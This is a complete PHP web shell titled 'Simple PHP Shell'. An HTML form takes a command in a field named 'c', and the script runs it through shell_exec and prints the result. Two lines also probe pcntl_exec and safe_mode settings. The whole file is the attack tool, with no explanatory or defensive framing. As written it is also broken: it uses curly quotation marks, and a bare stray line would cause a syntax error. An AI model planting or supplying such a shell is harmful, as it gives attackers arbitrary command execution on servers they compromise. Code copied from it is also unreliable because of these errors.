<HTML>
<HEAD>
<TITLE>Simple PHP Shell</TITLE>
</HEAD>
<BODY>
<form action=”shell.php” method=post>
<input type=”text” NAME=”c”/>
<input name=”submit” type=submit value=”Command”>
</FORM>
<?php
echo function_exists('pcntl_exec');
safe_mode_allowed_env_vars
var_dump(ini_get('safe_mode_allowed_env_vars'));
if(isset($_REQUEST[‘submit’]))
{
$c = $_REQUEST[‘c’];
$output = shell_exec(“$c”);
echo “<pre>$output</pre>\n”;
}
?>
</BODY>
</HTML>
